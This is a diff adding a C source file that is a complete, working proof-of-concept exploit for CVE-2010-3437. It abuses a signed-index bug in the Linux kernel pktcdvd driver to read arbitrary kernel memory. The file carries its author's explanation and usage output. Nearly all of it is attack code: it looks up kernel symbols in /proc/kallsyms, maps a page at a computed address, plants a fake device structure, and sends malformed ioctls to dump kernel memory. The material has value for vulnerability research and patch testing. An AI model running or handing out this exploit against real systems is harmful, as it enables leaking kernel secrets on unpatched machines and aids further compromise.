@@ -1,0 +1,359 @@
+/*
+ * cve-2010-3437.c
+ *
+ * Linux Kernel < 2.6.36-rc6 pktcdvd Kernel Memory Disclosure
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ * 
+ * Information:
+ *
+ *   https://bugzilla.redhat.com/show_bug.cgi?id=638085
+ *
+ *   The PKT_CTRL_CMD_STATUS device ioctl retrieves a pointer to a
+ *   pktcdvd_device from the global pkt_devs array.  The index into this
+ *   array is provided directly by the user and is a signed integer, so the
+ *   comparison to ensure that it falls within the bounds of this array will
+ *   fail when provided with a negative index.
+ *
+ * Usage:
+ *
+ *   $ gcc cve-2010-3437.c -o cve-2010-3437
+ *   $ ./cve-2010-3437
+ *   usage: ./cve-2010-3437 <address> <length>
+ *   $ ./cve-2010-3437 0xc0102290 64
+ *   [+] searching for pkt_devs kernel symbol...
+ *   [+] found pkt_devs at 0xc086fcc0
+ *   [+] opening pktcdvd device...
+ *   [+] calculated dereference address of 0x790070c0
+ *   [+] mapping page at 0x79007000 for pktcdvd_device dereference...
+ *   [+] setting up fake pktcdvd_device structure...
+ *   [+] dumping kmem from 0xc0102290 to 0xc01022d0 via malformed ioctls...
+ *   [+] dumping kmem to output...
+ *
+ *   55 89 e5 0f 1f 44 00 00 8b 48 3c 8b 50 04 8b ...
+ *   55 89 e5 57 56 53 0f 1f 44 00 00 89 d3 89 e2 ...
+ *
+ * Notes:
+ *
+ *   Pass the desired kernel memory address and dump length as arguments.
+ *
+ *   We can disclose 4 bytes of arbitrary kernel memory per ioctl call by 
+ *   specifying a large negative device index, causing the kernel to 
+ *   dereference to our fake pktcdvd_device structure in userspace and copy
+ *   data to userspace from an attacker-controlled address.  Since only 4 
+ *   bytes of kmem are disclosed per ioctl call, large dump sizes may take a
+ *   few seconds.
+ *
+ *   Tested on Ubuntu Lucid 10.04.  32-bit only for now.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <sys/utsname.h>
+#include <sys/mman.h>
+
+#define DEV_INDEX -300000000
+#define PAGE_SIZE 4096
+#define PKT_CTRL_CMD_STATUS 2
+
+struct pkt_ctrl_command {
+	uint32_t command;
+	int32_t dev_index;
+	uint32_t dev;
+	uint32_t pkt_dev;
+	uint32_t num_devices;
+	uint32_t padding;
+};
+
+#define PACKET_IOCTL_MAGIC ('X')
+#define PACKET_CTRL_CMD _IOWR(PACKET_IOCTL_MAGIC, 1, struct pkt_ctrl_command)
+
+struct block_device {
+	uint32_t bd_dev;
+} bd;
+
+struct pktcdvd_device {
+	struct block_device *bdev;
+} pd;
+
+#define MINORBITS 20
+#define MKDEV(ma,mi) (((ma) << MINORBITS) | (mi))
+
+uint32_t
+new_decode_dev(uint32_t dev)
+{
+	unsigned major = (dev & 0xfff00) >> 8;
+	unsigned minor = (dev & 0xff) | ((dev >> 12) & 0xfff00);
+	return MKDEV(major, minor);
+}
+
+const char hex_asc[] = "0123456789abcdef";
+#define hex_asc_lo(x) hex_asc[((x) & 0x0f)]
+#define hex_asc_hi(x) hex_asc[((x) & 0xf0) >> 4]
+
+void
+hex_dump_to_buffer(const void *buf, size_t len, int rowsize, int groupsize, char *linebuf, size_t linebuflen, int ascii)
+{
+	const uint8_t *ptr = buf;
+	uint8_t ch;
+	int j, lx = 0;
+	int ascii_column;
+
+	if (rowsize != 16 && rowsize != 32)
+		rowsize = 16;
+
+	if (!len)
+		goto nil;
+	if (len > rowsize)
+		len = rowsize;
+	if ((len % groupsize) != 0)
+		groupsize = 1;
+
+	switch (groupsize) {
+	case 8: {
+		const uint64_t *ptr8 = buf;
+		int ngroups = len / groupsize;
+
+		for (j = 0; j < ngroups; j++)
+			lx += snprintf(linebuf + lx, linebuflen - lx,
+				"%16.16llx ", (unsigned long long)*(ptr8 + j));
+		ascii_column = 17 * ngroups + 2;
+		break;
+	}
+
+	case 4: {
+		const uint32_t *ptr4 = buf;
+		int ngroups = len / groupsize;
+
+		for (j = 0; j < ngroups; j++)
+			lx += snprintf(linebuf + lx, linebuflen - lx,
+				"%8.8x ", *(ptr4 + j));
+		ascii_column = 9 * ngroups + 2;
+		break;
+	}
+
+	case 2: {
+		const uint16_t *ptr2 = buf;
+		int ngroups = len / groupsize;
+
+		for (j = 0; j < ngroups; j++)
+			lx += snprintf(linebuf + lx, linebuflen - lx,
+				"%4.4x ", *(ptr2 + j));
+		ascii_column = 5 * ngroups + 2;
+		break;
+	}
+
+	default:
+		for (j = 0; (j < rowsize) && (j < len) && (lx + 4) < linebuflen;
+			 j++) {
+			ch = ptr[j];
+			linebuf[lx++] = hex_asc_hi(ch);
+			linebuf[lx++] = hex_asc_lo(ch);
+			linebuf[lx++] = ' ';
+		}
+		ascii_column = 3 * rowsize + 2;
+		break;
+	}
+	if (!ascii)
+		goto nil;
+
+	while (lx < (linebuflen - 1) && lx < (ascii_column - 1))
+		linebuf[lx++] = ' ';
+	for (j = 0; (j < rowsize) && (j < len) && (lx + 2) < linebuflen; j++)
+		linebuf[lx++] = (isascii(ptr[j]) && isprint(ptr[j])) ? ptr[j]
+				: '.';
+nil:
+	linebuf[lx++] = '\0';
+}
+
+void
+print_hex_dump(int rowsize, int groupsize, const void *buf, size_t len, int ascii)
+{
+	const uint8_t *ptr = buf;
+	int i, linelen, remaining = len;
+	unsigned char linebuf[200];
+
+	if (rowsize != 16 && rowsize != 32)
+		rowsize = 16;
+
+	for (i = 0; i < len; i += rowsize) {
+		linelen = ((remaining) < (rowsize) ? (remaining) : (rowsize));
+		remaining -= rowsize;
+		hex_dump_to_buffer(ptr + i, linelen, rowsize, groupsize,
+		linebuf, sizeof(linebuf), ascii);
+		printf("%s\n", linebuf);
+	}
+}
+
+unsigned long
+get_kernel_symbol(char *name)
+{
+	FILE *f;
+	unsigned long addr;
+	struct utsname ver;
+	char dummy, sname[512];
+	int ret, rep = 0, oldstyle = 0;
+
+	f = fopen("/proc/kallsyms", "r");
+	if (f == NULL) {
+		f = fopen("/proc/ksyms", "r");
+		if (f == NULL) {
+			goto fallback;
+		}
+		oldstyle = 1;
+	}
+
+repeat:
+	ret = 0;
+	while(ret != EOF) {
+		if (!oldstyle) {
+			ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
+		} else {
+			ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
+			if (ret == 2) {
+				char *p;
+				if (strstr(sname, "_O/") || strstr(sname, "_S.")) {
+					continue;
+				}
+				p = strrchr(sname, '_');
+				if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
+					p = p - 4;
+					while (p > (char *)sname && *(p - 1) == '_') {
+						p--;
+					}
+					*p = '\0';
+				}
+			}
+		}
+		if (ret == 0) {
+			fscanf(f, "%s\n", sname);
+			continue;
+		}
+		if (!strcmp(name, sname)) {
+			fclose(f);
+			return addr;
+		}
+	}
+
+	fclose(f);
+	if (rep) {
+		return 0;
+	}
+fallback:
+	uname(&ver);
+	if (strncmp(ver.release, "2.6", 3)) {
+		oldstyle = 1;
+	}
+	sprintf(sname, "/boot/System.map-%s", ver.release);
+	f = fopen(sname, "r");
+	if (f == NULL) {
+		return 0;
+	}
+	rep = 1;
+	goto repeat;
+}
+
+void
+usage(char **argv)
+{
+	fprintf(stderr, "usage: %s <address> <length>\n", argv[0]);
+	exit(1);
+}
+
+int
+main(int argc, char **argv)
+{
+	int fd, ret, length;
+	void *mem, *dump, *ptr;
+	struct pkt_ctrl_command cmd;
+	unsigned long pkt_devs, map_addr, deref_addr;
+	unsigned long start_addr, end_addr, curr_addr;
+
+	if (argc < 3) {
+		usage(argv);
+	}
+
+	start_addr = strtoul(argv[1], NULL, 0);
+	length = strtoul(argv[2], NULL, 0);
+	end_addr = start_addr + length;
+
+	dump = malloc(length);
+	if (!dump) {
+		printf("[-] failed to allocate memory for kmem dump\n");
+		exit(1);
+	}
+	memset(dump, 0, length);
+
+	printf("[+] searching for pkt_devs kernel symbol...\n");
+
+	pkt_devs = get_kernel_symbol("pkt_devs");
+	if (!pkt_devs) {
+		printf("[-] could not find pkt_devs kernel symbol\n");
+		exit(1);
+	}
+	
+	printf("[+] found pkt_devs at %p\n", (void *) pkt_devs);
+
+	printf("[+] opening pktcdvd device...\n");
+
+	fd = open("/dev/pktcdvd/control", O_RDWR);
+	if (fd < 0) {
+		printf("[-] open of pktcdvd device failed\n");
+		exit(1);
+	}
+
+	deref_addr = pkt_devs + (DEV_INDEX * sizeof(void *));
+	map_addr = deref_addr & ~(PAGE_SIZE-1);
+
+	printf("[+] calculated dereference address of %p\n", (void *) deref_addr);
+	printf("[+] mapping page at %p for pktcdvd_device dereference...\n", (void *) map_addr);
+
+	mem = mmap((void *) map_addr, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
+	if (mem == MAP_FAILED) {
+		printf("[-] mmap failed\n");
+		exit(1);
+	}
+
+	printf("[+] setting up fake pktcdvd_device structure...\n");
+
+	*(unsigned long *) deref_addr = (unsigned long) &pd;
+
+	printf("[+] dumping kmem from %p to %p via malformed ioctls...\n", (void *) start_addr, (void *) end_addr);
+
+	memset(&cmd, 0, sizeof(cmd));
+	cmd.command = PKT_CTRL_CMD_STATUS;
+	cmd.dev_index = DEV_INDEX;
+
+	ptr = dump;
+	curr_addr = start_addr;
+
+	while (curr_addr < end_addr) {
+		pd.bdev = (struct block_device *) curr_addr;
+
+		ret = ioctl(fd, PACKET_CTRL_CMD, &cmd);
+		if (ret < 0) {
+			printf("[-] ioctl of pktcdvd device failed\n");
+			exit(1);
+		}
+
+		*(uint32_t *) ptr = (uint32_t) new_decode_dev(cmd.dev);
+
+		curr_addr += sizeof(uint32_t);
+		ptr += sizeof(uint32_t);
+	}
+
+	printf("[+] dumping kmem to output...\n");
+
+	printf("\n");
+	print_hex_dump(32, 1, dump, length, 1);
+	printf("\n");
+
+	return 0;
+}
